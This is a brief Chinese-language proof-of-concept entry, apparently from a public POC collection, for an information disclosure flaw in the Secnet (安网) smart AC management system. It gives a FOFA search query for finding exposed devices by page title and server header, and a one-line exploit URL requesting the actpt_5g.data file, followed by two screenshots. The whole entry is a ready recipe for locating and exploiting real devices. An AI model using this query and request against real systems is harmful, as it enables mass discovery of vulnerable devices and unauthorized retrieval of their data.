## Secnet安网 智能AC管理系统 actpt_5g 信息泄露

## fofa
```
title="安网-智能路由系统" || header="HTTPD_ac 1.0"
```
## poc
```
http://xxxxx/actpt_5g.data
```

![069c247466403f3336550f21bcea0ff4](https://github.com/wy876/POC/assets/139549762/205a328b-f4cf-41a6-8cc0-c8d74db79876)

![e06692e5a2926d80686685b5e8fec3c4](https://github.com/wy876/POC/assets/139549762/9caa2d80-b573-4638-b500-9bd87f642c51)

